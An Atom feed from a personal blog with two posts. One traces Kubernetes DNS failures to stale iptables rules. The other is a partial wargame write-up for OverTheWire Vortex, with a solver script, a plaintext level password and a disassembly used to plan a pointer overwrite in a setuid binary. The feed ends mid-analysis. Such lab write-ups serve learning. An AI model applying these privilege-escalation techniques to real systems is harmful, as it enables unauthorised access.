<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Programming & Software | David Xia]]></title>
  <link href="https://www.davidxia.com/categories/programming-and-software/atom.xml" rel="self"/>
  <link href="https://www.davidxia.com/"/>
  <updated>2021-01-27T15:09:38-05:00</updated>
  <id>https://www.davidxia.com/</id>
  <author>
    <name><![CDATA[David Xia]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[How Kubernetes Routes IP Packets to Services' Cluster IPs]]></title>
    <link href="https://www.davidxia.com/2021/01/how-kubernetes-routes-ip-packets-to-services-cluster-ips/"/>
    <updated>2021-01-27T13:22:02-05:00</updated>
    <id>https://www.davidxia.com/2021/01/how-kubernetes-routes-ip-packets-to-services-cluster-ips</id>
    <content type="html"><![CDATA[<p>I recently observed DNS resolution errors on a large Kubernetes (K8s) cluster. This behavior was
only happening on 0.1% of K8s nodes. But the fact that this behavior wasn&rsquo;t self-healing and
crippled tenant workloads in addition to my penchant to chase rabbits down holes meant I
wasn&rsquo;t going to let it go. I emerged learning how K8s Services&#8217; Cluster IP feature actually works.
Explaining this feature and my particular problem and speculative fix is the goal of this post.</p>

<h2>The Problem</h2>

<p>The large K8s cluster is actually a Google Kubernetes Engine (GKE) cluster with master version
1.17.14-gke.400 and node version 1.17.13-gke.2600. This is a multi-tenant cluster with hundreds of
nodes. Each node runs dozens of user workloads. Some users said DNS resolution within their Pods on
certain nodes weren&rsquo;t working. I was able to reproduce this behavior with the following steps.</p>

<p>Kubernetes schedules <code>kube-dns</code> Pods and a Service on the cluster that provide DNS and configures
kubelets to tell individual containers to use the DNS Service&rsquo;s IP to resolve DNS names. <a href="https://kubernetes.io/docs/concepts/services-networking/dns-pod-service/">See K8s
docs here</a>. First I get the <code>kube-dns</code>&lsquo; Service&rsquo;s Cluster IP. This is the IP address to
which DNS queries from Pods are sent.</p>

<pre><code>kubectl --context my-gke-cluster -n kube-system get services kube-dns
NAME       TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)         AGE
kube-dns   ClusterIP   10.178.64.10   &lt;none&gt;        53/UDP,53/TCP   666d
</code></pre>

<p>Then I make DNS queries against the Cluster IP from a Pod running on a broken node.</p>

<!-- more -->


<pre><code># Log into the GKE node
gcloud --project my-project compute ssh my-gke-node --zone us-central1-b --internal-ip

# Need to run toolbox container which has iptables command. Google's Container-Optimized OS doesn't
# have it.
dxia@my-gke-node ~ $ toolbox
20200603-00: Pulling from google-containers/toolbox
Digest: sha256:36e2f6b8aa40328453aed7917860a8dee746c101dfde4464ce173ed402c1ec57
Status: Image is up to date for gcr.io/google-containers/toolbox:20200603-00
gcr.io/google-containers/toolbox:20200603-00
e6b1ee70f91ac405623cbf1d2afa9a532a022dc644bddddd754d2cd786f58273

dxia-gcr.io_google-containers_toolbox-20200603-00
Please do not use --share-system anymore, use $SYSTEMD_NSPAWN_SHARE_* instead.
Spawning container dxia-gcr.io_google-containers_toolbox-20200603-00 on /var/lib/toolbox/dxia-gcr.io_google-containers_toolbox-20200603-00.
Press ^] three times within 1s to kill container.

# Install dig
root@toolbox:~# apt-get update &amp;&amp; apt-get install dnsutils

# Ask the kube-dns Cluster IP to resolve www.google.com
# dig will hang when it's waiting on a DNS reply. So ^C's show DNS resolution failures
root@toolbox:~# for x in $(seq 1 20); do echo ${x}; dig @10.178.64.10 www.google.com &gt; /dev/null; done
1
^C2
^C3
4
5
6
7
8
^C9
10
11
12
13
14
15
^C16
17
18
^C19
20
</code></pre>

<p>I cordoned and drained the node and added the annotation
<code>cluster-autoscaler.kubernetes.io/scale-down-disabled=true</code> to <a href="https://github.com/kubernetes/autoscaler/blob/b470c62bfa6269ed185d21d47dadc339353deb68/cluster-autoscaler/FAQ.md#how-can-i-prevent-cluster-autoscaler-from-scaling-down-a-particular-node">prevent the cluster autoscaler from
deleting it</a>.</p>

<p>Then I performed a more basic test. I tested whether I could even make a TCP connection to the
Cluster IP on port 53 (default DNS port).</p>

<pre><code># Run nc 1000 times without reverse DNS lookup, in verbose and scan mode
# Count only failed connections
root@toolbox:~# for x in $(seq 1 1000); do nc 10.178.64.10 53 -nvz 2&gt;&amp;1 | grep -v open; done | wc -l
257
</code></pre>

<p>A quarter of the TCP connections fail. This means the error is below the DNS layer at TCP layer 3.</p>

<h2>Finding the Root Cause: Down the Rabbit Hole</h2>

<p>Some background for those unfamiliar. K8s nodes (via the <code>kube-proxy</code> DaemonSet) will route IP
packets originating from a Pod with a destination of a K8s Service&rsquo;s Cluster IP to a backing Pod IP
in <a href="https://kubernetes.io/docs/concepts/services-networking/service/#virtual-ips-and-service-proxies">one of three proxy modes</a>: user space, iptables, and IPVS. I&rsquo;m assuming GKE
runs <code>kube-proxy</code> in iptables proxy mode since <a href="https://cloud.google.com/kubernetes-engine/docs/concepts/network-overview#kube-proxy">iptables instead of IPVS is mentioned in their docs
here</a>.</p>

<p><code>kube-proxy</code> should keep the node&rsquo;s iptable rules up to date with the actual <code>kube-dns</code>
Service&rsquo;s endpoints. The following console output shows how I figured out the IP packet flow by
tracing matching iptables rules.</p>

<pre><code># List rules in FORWARD chain's filter table
root@toolbox:~# iptables -L FORWARD -t filter
Chain FORWARD (policy DROP)
target     prot opt source               destination
cali-FORWARD  all  --  anywhere             anywhere             /* cali:wUHhoiAYhphO9Mso */
KUBE-FORWARD  all  --  anywhere             anywhere             /* kubernetes forwarding rules */
KUBE-SERVICES  all  --  anywhere             anywhere             ctstate NEW /* kubernetes service portals */
DOCKER-USER  all  --  anywhere             anywhere
DOCKER-ISOLATION-STAGE-1  all  --  anywhere             anywhere
ACCEPT     all  --  anywhere             anywhere             ctstate RELATED,ESTABLISHED
DOCKER     all  --  anywhere             anywhere
ACCEPT     all  --  anywhere             anywhere
ACCEPT     all  --  anywhere             anywhere
ACCEPT     tcp  --  anywhere             anywhere
ACCEPT     udp  --  anywhere             anywhere
ACCEPT     icmp --  anywhere             anywhere
ACCEPT     sctp --  anywhere             anywhere

# List rules in KUBE-SERVICES chain's nat table and look for rules that forward IP packets destined
# for the K8s Service kube-system/kube-dns' Cluster IP
root@toolbox:~# iptables -L KUBE-SERVICES -t nat | grep kube-system/kube-dns | grep SVC
KUBE-SVC-ERIFXISQEP7F7OF4  tcp  --  anywhere             10.178.64.10         /* kube-system/kube-dns:dns-tcp cluster IP */ tcp dpt:domain
KUBE-SVC-TCOU7JCQXEZGVUNU  udp  --  anywhere             10.178.64.10         /* kube-system/kube-dns:dns cluster IP */ udp dpt:domain

# List rules in KUBE-SVC-ERIFXISQEP7F7OF4 chain's nat table
Chain KUBE-SVC-ERIFXISQEP7F7OF4 (1 references)
target     prot opt source               destination
KUBE-SEP-BMNCBK7ROA3MA6UU  all  --  anywhere             anywhere             statistic mode random probability 0.01538461540
KUBE-SEP-GYUBQUCI6VR6AER2  all  --  anywhere             anywhere             statistic mode random probability 0.01562500000
KUBE-SEP-IF56RUVXN2P4ORZZ  all  --  anywhere             anywhere             statistic mode random probability 0.01587301586
KUBE-SEP-WUD7OE7TYMWFJJYX  all  --  anywhere             anywhere             statistic mode random probability 0.01612903224
KUBE-SEP-B7IYZJB6QVUX246S  all  --  anywhere             anywhere             statistic mode random probability 0.01639344264
KUBE-SEP-T6B7SPNOX3DH33BE  all  --  anywhere             anywhere             statistic mode random probability 0.01666666660
KUBE-SEP-REJSUT2VC76HMIRQ  all  --  anywhere             anywhere             statistic mode random probability 0.01694915257
KUBE-SEP-B4N4VXNUSBNXHV73  all  --  anywhere             anywhere             statistic mode random probability 0.01724137925
KUBE-SEP-XUJIW6IGZX4X5BBG  all  --  anywhere             anywhere             statistic mode random probability 0.01754385978
KUBE-SEP-MMBQBWR6AYIPMUZL  all  --  anywhere             anywhere             statistic mode random probability 0.01785714272
KUBE-SEP-6O5U6FAKQVEXGTP7  all  --  anywhere             anywhere             statistic mode random probability 0.01818181807
KUBE-SEP-DMN3RJWMPAEHNOGE  all  --  anywhere             anywhere             statistic mode random probability 0.01851851866
KUBE-SEP-FHJKZIH3JDZSXJUD  all  --  anywhere             anywhere             statistic mode random probability 0.01886792434
KUBE-SEP-YRPM7BEQS2YESSJL  all  --  anywhere             anywhere             statistic mode random probability 0.01923076902
KUBE-SEP-BSHQZGGNYIILL3V7  all  --  anywhere             anywhere             statistic mode random probability 0.01960784290
KUBE-SEP-XTW5FCAH2423EWAV  all  --  anywhere             anywhere             statistic mode random probability 0.02000000002
KUBE-SEP-2ETTGYCM3KLKL54Q  all  --  anywhere             anywhere             statistic mode random probability 0.02040816331
KUBE-SEP-ZUFFQWVT2EY73YVF  all  --  anywhere             anywhere             statistic mode random probability 0.02083333349
KUBE-SEP-VUNSBD5OILT2BGUX  all  --  anywhere             anywhere             statistic mode random probability 0.02127659554
KUBE-SEP-3XVS5OF4SBBHATZW  all  --  anywhere             anywhere             statistic mode random probability 0.02173913037
KUBE-SEP-IRW2YX5BEMBR3OGF  all  --  anywhere             anywhere             statistic mode random probability 0.02222222229
KUBE-SEP-6J6T3TOCBEQ5NUQ5  all  --  anywhere             anywhere             statistic mode random probability 0.02272727247
KUBE-SEP-E3FOMPW5DQK5FDIA  all  --  anywhere             anywhere             statistic mode random probability 0.02325581387
KUBE-SEP-EO4O2TBNDPU377YQ  all  --  anywhere             anywhere             statistic mode random probability 0.02380952379
KUBE-SEP-ZGRZOBXXZ2KPGNZD  all  --  anywhere             anywhere             statistic mode random probability 0.02439024393
KUBE-SEP-XLRCUOCE6XAL3TYE  all  --  anywhere             anywhere             statistic mode random probability 0.02499999991
KUBE-SEP-477YCBVB2RZ4WKUD  all  --  anywhere             anywhere             statistic mode random probability 0.02564102551
KUBE-SEP-FGVS22Q3OCM6S5VS  all  --  anywhere             anywhere             statistic mode random probability 0.02631578967
KUBE-SEP-FBHD55TKQKCEKSUO  all  --  anywhere             anywhere             statistic mode random probability 0.02702702722
KUBE-SEP-ULRGL5A7XKWV3HB6  all  --  anywhere             anywhere             statistic mode random probability 0.02777777798
KUBE-SEP-HO6T2NOJNNMVWDPW  all  --  anywhere             anywhere             statistic mode random probability 0.02857142873
KUBE-SEP-PV23DIU55F5LDJIX  all  --  anywhere             anywhere             statistic mode random probability 0.02941176482
KUBE-SEP-6PL2LOTBN64MN2IF  all  --  anywhere             anywhere             statistic mode random probability 0.03030303027
KUBE-SEP-3G3LTNLLVZWE57GZ  all  --  anywhere             anywhere             statistic mode random probability 0.03125000000
KUBE-SEP-SNHFF6VK2KP44I7Q  all  --  anywhere             anywhere             statistic mode random probability 0.03225806449
KUBE-SEP-KNOCRXE7JOQ4FBTI  all  --  anywhere             anywhere             statistic mode random probability 0.03333333321
KUBE-SEP-M5NXUS47V77SM3HZ  all  --  anywhere             anywhere             statistic mode random probability 0.03448275849
KUBE-SEP-VEMFKB2E3QRFFRSG  all  --  anywhere             anywhere             statistic mode random probability 0.03571428591
KUBE-SEP-RRYDQV524YXA4GDR  all  --  anywhere             anywhere             statistic mode random probability 0.03703703685
KUBE-SEP-G65AAYF5LWFW4YBM  all  --  anywhere             anywhere             statistic mode random probability 0.03846153850
KUBE-SEP-K4HN6ANXSPKA7JGZ  all  --  anywhere             anywhere             statistic mode random probability 0.04000000004
KUBE-SEP-72YXYSKWHCML6KJJ  all  --  anywhere             anywhere             statistic mode random probability 0.04166666651
KUBE-SEP-YCD5TFDQM4ELQ5WX  all  --  anywhere             anywhere             statistic mode random probability 0.04347826075
KUBE-SEP-U7N4W7N5OKDP5PNC  all  --  anywhere             anywhere             statistic mode random probability 0.04545454541
KUBE-SEP-ACPRKJJSJ73NAQNV  all  --  anywhere             anywhere             statistic mode random probability 0.04761904757
KUBE-SEP-HPAV4MFMKCM43BC2  all  --  anywhere             anywhere             statistic mode random probability 0.04999999981
KUBE-SEP-VXO5CPBPAES2GS3A  all  --  anywhere             anywhere             statistic mode random probability 0.05263157887
KUBE-SEP-LJ3HM5QDYEB4ICUB  all  --  anywhere             anywhere             statistic mode random probability 0.05555555550
KUBE-SEP-W6VORIPTN7FDPIMU  all  --  anywhere             anywhere             statistic mode random probability 0.05882352963
KUBE-SEP-A5SGQE4VKXUT2NEC  all  --  anywhere             anywhere             statistic mode random probability 0.06250000000
KUBE-SEP-4LCLRUWZUF2DDGKK  all  --  anywhere             anywhere             statistic mode random probability 0.06666666688
KUBE-SEP-K7NZ33CKVQDPMIET  all  --  anywhere             anywhere             statistic mode random probability 0.07142857136
KUBE-SEP-76ISGBIKEK2QPYDL  all  --  anywhere             anywhere             statistic mode random probability 0.07692307699
KUBE-SEP-3S5ELV7JJCII2KNO  all  --  anywhere             anywhere             statistic mode random probability 0.08333333349
KUBE-SEP-THLYLIADKU5Z5I32  all  --  anywhere             anywhere             statistic mode random probability 0.09090909082
KUBE-SEP-T7P5MBD5MAWH2XB5  all  --  anywhere             anywhere             statistic mode random probability 0.10000000009
KUBE-SEP-WQ6DVZHCVUTU5QJS  all  --  anywhere             anywhere             statistic mode random probability 0.11111111101
KUBE-SEP-5RVGOA4UDKOKKI7O  all  --  anywhere             anywhere             statistic mode random probability 0.12500000000
KUBE-SEP-VSXQV2AZ43RZQSL7  all  --  anywhere             anywhere             statistic mode random probability 0.14285714272
KUBE-SEP-RVDWX7YLRKCSUDII  all  --  anywhere             anywhere             statistic mode random probability 0.16666666651
KUBE-SEP-OECSAM56W6JQA562  all  --  anywhere             anywhere             statistic mode random probability 0.20000000019
KUBE-SEP-HY76TWODHVCVLG5Y  all  --  anywhere             anywhere             statistic mode random probability 0.25000000000
KUBE-SEP-3UNVKH34LEKZ2P5K  all  --  anywhere             anywhere             statistic mode random probability 0.33333333349
KUBE-SEP-TDCXKWGVKJJ22VHB  all  --  anywhere             anywhere             statistic mode random probability 0.50000000000
KUBE-SEP-Z7ZOTGJIY44EKMWW  all  --  anywhere             anywhere

# List the rules of two random chains above to see the DNAT'ed Pod IP
root@toolbox:~# iptables -L KUBE-SEP-RVDWX7YLRKCSUDII -t nat
Chain KUBE-SEP-RVDWX7YLRKCSUDII (1 references)
target     prot opt source               destination
KUBE-MARK-MASQ  all  --  10.179.94.16         anywhere
DNAT       tcp  --  anywhere             anywhere             tcp to::0 persistent:0 persistent

root@toolbox:~# iptables -L KUBE-SEP-6PL2LOTBN64MN2IF -t nat
Chain KUBE-SEP-6PL2LOTBN64MN2IF (1 references)
target     prot opt source               destination
KUBE-MARK-MASQ  all  --  10.179.45.66         anywhere
DNAT       tcp  --  anywhere             anywhere             tcp to::0 persistent:0 persistent
</code></pre>

<p>These final rules are the ones that actually replace the destination Cluster IP of 10.178.64.10 with
a randomly chosen <code>kube-dns</code> Pod IP. The random selection is implemented by the rules in the
<code>KUBE-SVC-ERIFXISQEP7F7OF4</code> chain which have <code>statistic mode random probability p</code>. Rules are
matched top down. So the first rule with target <code>KUBE-SEP-BMNCBK7ROA3MA6UU</code> has a probability of
0.01538461540 of being picked. The second rule with target <code>KUBE-SEP-GYUBQUCI6VR6AER2</code> has a
probability of 0.01562500000 of being picked. But this 0.01562500000 is applied to the probability
that the first rule didn&rsquo;t match. So its overall probability is (1 - 0.01538461540) * 0.01562500000
~= 0.01538461540. Applying this calculation to the other rules, you can see each rule has a
probability of 0.01538461540 or <code>1/n</code> in being selected where <code>n</code> = 65 is the total number of kube-dns
Pods in this case. This algorithm is actually a variation of [resevoir sampling].</p>

<h3>Confirming the Root Cause</h3>

<p>At this point I strongly suspected the iptables rules were stale and routing packets to kube-dns
Pod IPs that no longer exist. In order to confirm this I wanted to find an actual DNAT&#8217;ed IP that
didn&rsquo;t correspond to any actual kube-dns Pod. There were 65 rules in the <code>KUBE-SVC-ERIFXISQEP7F7OF4</code>
chain, but I expected 77 because that was the number of <code>kube-dns</code> Pods.</p>

<pre><code>kubectl --context my-gke-cluster -n kube-system get endpoints kube-dns -o json | jq -r .subsets[0].addresses | jq length
77
</code></pre>

<p>On nodes without DNS issues, I saw the correct number of rules.</p>

<pre><code>root@healthy-gke-node:~# iptables -L KUBE-SVC-ERIFXISQEP7F7OF4 -t nat | wc -l
79 [two extra lines of headers]
</code></pre>

<p>I saw this Pod IP when inspecting a randomly chosen rule on <code>my-gke-node</code>.</p>

<pre><code>root@toolbox:~# iptables -L KUBE-SEP-RVDWX7YLRKCSUDII -t nat
Chain KUBE-SEP-RVDWX7YLRKCSUDII (1 references)
target     prot opt source               destination
KUBE-MARK-MASQ  all  --  10.179.94.16         anywhere
DNAT       tcp  --  anywhere             anywhere             tcp to::0 persistent:0 persistent
</code></pre>

<p>No <code>kube-dns</code> Pod existed with this IP.</p>

<pre><code>kubectl --context my-gke-cluster -n kube-system get pods --selector k8s-app=kube-dns -o wide | grep 10.179.94.16
[no output]
</code></pre>

<p>This confirmed <code>kube-proxy</code> wasn&rsquo;t updating the iptables rules for <code>kube-dns</code>. Why? The <code>kube-proxy</code>
logs on the node showed these ongoing occurring errors.</p>

<pre><code>dxia@my-gke-node ~ $ tail -f /var/log/kube-proxy.log
E0126 20:40:24.739255       1 reflector.go:153] k8s.io/client-go/informers/factory.go:135: Failed to list *v1.Service: an error on the server ("") has prevented the request from succeeding (get services)
E0126 20:40:24.739611       1 reflector.go:153] k8s.io/client-go/informers/factory.go:135: Failed to list *v1.Endpoints: an error on the server ("") has prevented the request from succeeding (get endpoints)
E0126 20:40:34.742869       1 reflector.go:153] k8s.io/client-go/informers/factory.go:135: Failed to list *v1.Service: an error on the server ("") has prevented the request from succeeding (get services)
</code></pre>

<h2>The Speculative Fix</h2>

<p>I think these <code>kube-proxy</code> errors are caused by this underlying K8s bug, but I&rsquo;m not sure.</p>

<blockquote><p>we found that after the problem occurred all subsequent requests were still send on the same
connection. It seems that although the client will resend the request to apiserver, but the
underlay http2 library still maintains the old connection so all subsequent requests are still
send on this connection and received the same error use of closed connection.</p>

<p>So the question is why http2 still maintains an already closed connection? Maybe the connection it
maintained is indeed alive but some intermediate connections are closed unexpectedly?</p></blockquote>

<p>&mdash; <a href="https://github.com/kubernetes/kubernetes/issues/87615#issuecomment-596312532">https://github.com/kubernetes/kubernetes/issues/87615#issuecomment-596312532</a></p>

<p>The bug in that issue is <a href="https://github.com/kubernetes/kubernetes/issues/87615#issuecomment-743342319">fixed in K8s 1.19 and 1.20</a>.</p>

<p>If you&rsquo;re using GKE and Google Cloud Monitoring, this log query will show which nodes&#8217; kube-proxy
Pods can&rsquo;t get updated Service and Endpoint data from the K8s API.</p>

<pre><code>resource.type="k8s_node"
resource.labels.project_id="[YOUR-PROJECT]"
logName="projects/gke-xpn-1/logs/kube-proxy"
jsonPayload.message:"Failed to list "
severity=ERROR
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[My Hints and Solutions to the First Three Levels of Over the Wire Vortex]]></title>
    <link href="https://www.davidxia.com/2020/12/my-hints-and-solutions-to-the-first-three-levels-of-over-the-wire-vortex/"/>
    <updated>2020-12-25T20:21:28-05:00</updated>
    <id>https://www.davidxia.com/2020/12/my-hints-and-solutions-to-the-first-three-levels-of-over-the-wire-vortex</id>
    <content type="html"><![CDATA[<p>I recently found more wargames at <a href="https://overthewire.org/">overthewire.org</a>. Here are my hints and
solutions for the first three levels of Vortex. The levels are cumulative. We
have to beat the previous level in order to access the next.</p>

<h1><a href="https://overthewire.org/wargames/vortex/vortex0.html">Vortex Level 0 -> Level 1</a></h1>

<p><details>
  <summary>Hint 1: how much data</summary>
  Connect to the host and port and read all the bytes you can. How many bytes do you get?
</details></p>

<p><details>
  <summary>Hint 2: endianess</summary>
  &ldquo;&hellip;read in 4 unsigned integers in host byte order&rdquo; means the bytes are
  already in host byte order or little-endian. If your system is also
  little-endian, you don&rsquo;t need to do anything special when interpreting the
  bytes.
</details></p>

<p><details>
  <summary>Hint 3: expected reply</summary>
  How many bytes is each integer? What is the sum of all four?
</details></p>

<!-- more -->


<h2>My solution</h2>

<pre><code class="python">#!/usr/bin/env python3

# Example output
# got bytes 53 ac 40 65 d4 36 07 63 5b 74 dd 4b 0f b6 cc 4d
# sum of first four unsigned ints (16 bytes assuming each unsigned int is 4 bytes) is 5938220433
# replying with bytes 91 0d f2 61 01 00 00 00
# Username: vortex1 Password: Gq#qu3bF3

import binascii
import struct
import socket

HOST = 'vortex.labs.overthewire.org'
PORT = 5842

s = socket.socket()
s.connect((HOST, PORT))

r = s.recv(1024)
print(f'got bytes {r.hex(" ")}')

ba = bytearray(r)
# Since the machine is a 32-bit system, each integer will be four bytes.
# So we interpret each integer four bytes at a time.
int_a = struct.unpack('I', ba[:4])[0]
int_b = struct.unpack('I', ba[4:8])[0]
int_c = struct.unpack('I', ba[8:12])[0]
int_d = struct.unpack('I', ba[12:16])[0]

# Sum all the integers.
_sum = int_a + int_b + int_c + int_d
print(f'sum of first four unsigned ints (16 bytes assuming each unsigned int is 4 bytes) is {_sum}')

# Packing like this seems to take care of endianess by default
reply_bytes = struct.pack('Q', _sum)
print(f'replying with bytes {reply_bytes.hex(" ")}')
s.sendall(reply_bytes)
r = s.recv(1024)
print(r.decode('ascii'))

s.close()
</code></pre>

<h1><a href="https://overthewire.org/wargames/vortex/vortex1.html">Vortex Level 1 -> Level 2</a></h1>

<p>This solution assumes we have solved the previous level and can SSH into the
machine as user vortex1. Caveat: the machine is extremely slow.</p>

<p>First let&rsquo;s find out some information about the machine.</p>

<pre><code>ssh vortex1@vortex.labs.overthewire.org -p 2228
                 _
__   _____  _ __| |_ _____  __
\ \ / / _ \| '__| __/ _ \ \/ /
 \ V / (_) | |  | ||  __/&gt;  &lt;
  \_/ \___/|_|   \__\___/_/\_\

a http://www.overthewire.org wargame.

vortex1@vortex.labs.overthewire.org's password:
Welcome to Ubuntu 14.04 LTS (GNU/Linux 4.4.0-92-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
</code></pre>

<p>It&rsquo;s a machine running Ubuntu 14.04.</p>

<pre><code>vortex1@vortex:~$ uname -i
x86_64
</code></pre>

<p>It&rsquo;s a 64-bit system.</p>

<pre><code>vortex1@vortex:~$ cat /proc/sys/kernel/randomize_va_space
0
</code></pre>

<p>ASLR is disabled.</p>

<p><details>
  <summary>Hint 1: password location for next level</summary>
  The instructions don&rsquo;t tell you this, but the password for the next level is
  located in the directory <code>/etc/vortex_pass</code>.
</details></p>

<p><details>
  <summary>Hint 2: required permissions</summary>
  What are the permissions of the password file for the next level? How can you
  read this file?
</details></p>

<p><details>
  <summary>Hint 3: program source code</summary>
  What does the program do? Can you see the code path you need to execute to
  elevate your privileges?
</details></p>

<p><details>
  <summary>Hint 4: how to change <code>ptr</code></summary>
  How can you change the value of <code>ptr</code> to the right value? You shouldn&rsquo;t need
  to send more than ~300 bytes to the program to do so.
</details></p>

<h2>My solution</h2>

<p>Let&rsquo;s disassemble the executable to gain some insight into the stack layout.</p>

<pre><code>vortex1@vortex:~$ gdb /vortex/vortex1
GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.3) 7.7.1
Copyright (C) 2014 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
&lt;http://www.gnu.org/software/gdb/bugs/&gt;.
Find the GDB manual and other documentation resources online at:
&lt;http://www.gnu.org/software/gdb/documentation/&gt;.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /vortex/vortex1...(no debugging symbols found)...done.

(gdb) set disassembly-flavor intel
(gdb) set pagination off
(gdb) disassemble main
Dump of assembler code for function main:
   0x080485c0 &lt;+0&gt;: push   ebp
   0x080485c1 &lt;+1&gt;: mov    ebp,esp
   0x080485c3 &lt;+3&gt;: push   esi
   0x080485c4 &lt;+4&gt;: push   ebx
   0x080485c5 &lt;+5&gt;: and    esp,0xfffffff0
   0x080485c8 &lt;+8&gt;: sub    esp,0x220                  # Set stack pointer
   0x080485ce &lt;+14&gt;:    mov    eax,gs:0x14
   0x080485d4 &lt;+20&gt;:    mov    DWORD PTR [esp+0x21c],eax  
   0x080485db &lt;+27&gt;:    xor    eax,eax
   0x080485dd &lt;+29&gt;:    lea    eax,[esp+0x1c]
   0x080485e1 &lt;+33&gt;:    add    eax,0x100                  # + (sizeof(buf) / 2)
   0x080485e6 &lt;+38&gt;:    mov    DWORD PTR [esp+0x14],eax   # ptr is located at $esp + 0x14
   0x080485ea &lt;+42&gt;:    jmp    0x804868e &lt;main+206&gt;
   0x080485ef &lt;+47&gt;:    mov    eax,DWORD PTR [esp+0x18]
   0x080485f3 &lt;+51&gt;:    cmp    eax,0xa
   0x080485f6 &lt;+54&gt;:    je     0x80485ff &lt;main+63&gt;
   0x080485f8 &lt;+56&gt;:    cmp    eax,0x5c
   0x080485fb &lt;+59&gt;:    je     0x8048615 &lt;main+85&gt;
   0x080485fd &lt;+61&gt;:    jmp    0x804861c &lt;main+92&gt;
   0x080485ff &lt;+63&gt;:    mov    DWORD PTR [esp+0x4],0x200
   0x08048607 &lt;+71&gt;:    lea    eax,[esp+0x1c]
   0x0804860b &lt;+75&gt;:    mov    DWORD PTR [esp],eax
   0x0804860e &lt;+78&gt;:    call   0x804856d &lt;print&gt;
   0x08048613 &lt;+83&gt;:    jmp    0x804868e &lt;main+206&gt;
   0x08048615 &lt;+85&gt;:    sub    DWORD PTR [esp+0x14],0x1
   0x0804861a &lt;+90&gt;:    jmp    0x804868e &lt;main+206&gt;
   0x0804861c &lt;+92&gt;:    mov    eax,DWORD PTR [esp+0x14]
   0x08048620 &lt;+96&gt;:    and    eax,0xff000000
   0x08048625 &lt;+101&gt;:   cmp    eax,0xca000000
   0x0804862a &lt;+106&gt;:   jne    0x804866b &lt;main+171&gt;
   0x0804862c &lt;+108&gt;:   call   0x8048430 &lt;geteuid@plt&gt;
   0x08048631 &lt;+113&gt;:   mov    esi,eax
   0x08048633 &lt;+115&gt;:   call   0x8048430 &lt;geteuid@plt&gt;
   0x08048638 &lt;+120&gt;:   mov    ebx,eax
   0x0804863a &lt;+122&gt;:   call   0x8048430 &lt;geteuid@plt&gt;
   0x0804863f &lt;+127&gt;:   mov    DWORD PTR [esp+0x8],esi
   0x08048643 &lt;+131&gt;:   mov    DWORD PTR [esp+0x4],ebx
   0x08048647 &lt;+135&gt;:   mov    DWORD PTR [esp],eax
   0x0804864a &lt;+138&gt;:   call   0x80483e0 &lt;setresuid@plt&gt;
   0x0804864f &lt;+143&gt;:   mov    DWORD PTR [esp+0x8],0x0
   0x08048657 &lt;+151&gt;:   mov    DWORD PTR [esp+0x4],0x804876a
   0x0804865f &lt;+159&gt;:   mov    DWORD PTR [esp],0x804876d
   0x08048666 &lt;+166&gt;:   call   0x8048420 &lt;execlp@plt&gt;
   0x0804866b &lt;+171&gt;:   lea    eax,[esp+0x1c]
   0x0804866f &lt;+175&gt;:   add    eax,0x200
   0x08048674 &lt;+180&gt;:   cmp    DWORD PTR [esp+0x14],eax
   0x08048678 &lt;+184&gt;:   jbe    0x804867c &lt;main+188&gt;
   0x0804867a &lt;+186&gt;:   jmp    0x804868d &lt;main+205&gt;
   0x0804867c &lt;+188&gt;:   mov    eax,DWORD PTR [esp+0x14]
   0x08048680 &lt;+192&gt;:   lea    edx,[eax+0x1]
   0x08048683 &lt;+195&gt;:   mov    DWORD PTR [esp+0x14],edx
   0x08048687 &lt;+199&gt;:   mov    edx,DWORD PTR [esp+0x18]
   0x0804868b &lt;+203&gt;:   mov    BYTE PTR [eax],dl
   0x0804868d &lt;+205&gt;:   nop
   0x0804868e &lt;+206&gt;:   call   0x8048400 &lt;getchar@plt&gt;
   0x08048693 &lt;+211&gt;:   mov    DWORD PTR [esp+0x18],eax          # x is located at $esp + 0x18
   0x08048697 &lt;+215&gt;:   cmp    DWORD PTR [esp+0x18],0xffffffff
   0x0804869c &lt;+220&gt;:   jne    0x80485ef &lt;main+47&gt;
   0x080486a2 &lt;+226&gt;:   mov    DWORD PTR [esp],0x8048775
   0x080486a9 &lt;+233&gt;:   call   0x8048440 &lt;puts@plt&gt;
   0x080486ae &lt;+238&gt;:   mov    eax,0x0
   0x080486b3 &lt;+243&gt;:   mov    ecx,DWORD PTR [esp+0x21c]
   0x080486ba &lt;+250&gt;:   xor    ecx,DWORD PTR gs:0x14
   0x080486c1 &lt;+257&gt;:   je     0x80486c8 &lt;main+264&gt;
   0x080486c3 &lt;+259&gt;:   call   0x8048410 &lt;__stack_chk_fail@plt&gt;
   0x080486c8 &lt;+264&gt;:   lea    esp,[ebp-0x8]
   0x080486cb &lt;+267&gt;:   pop    ebx
   0x080486cc &lt;+268&gt;:   pop    esi
   0x080486cd &lt;+269&gt;:   pop    ebp
   0x080486ce &lt;+270&gt;:   ret
End of assembler dump.
</code></pre>

<p>At <code>main+8</code>, the stack pointer <code>esp</code> is decreased by 0x220 to make room for <code>unsigned
char buf[512]</code>, <code>unsigned char *ptr</code>, and <code>unsigned int x</code>. If we look more closely at the assembly,
we can see <code>ptr</code> is located at <code>esp + 0x14</code> because the instruction before that increases <code>eax</code> by
<code>0x100</code> or <code>(sizeof(buf) / 2)</code> or 256. <code>main+211</code> shows <code>x</code> is located right after <code>ptr</code> at <code>esp +
0x18</code> since the instruction right before calls <code>getchar()</code>. This means <code>buf[512]</code> is after that and
takes up the majority of the stack. So the stack layout is <code>ptr</code>, <code>x</code>, then <code>buf[512]</code>. This makes
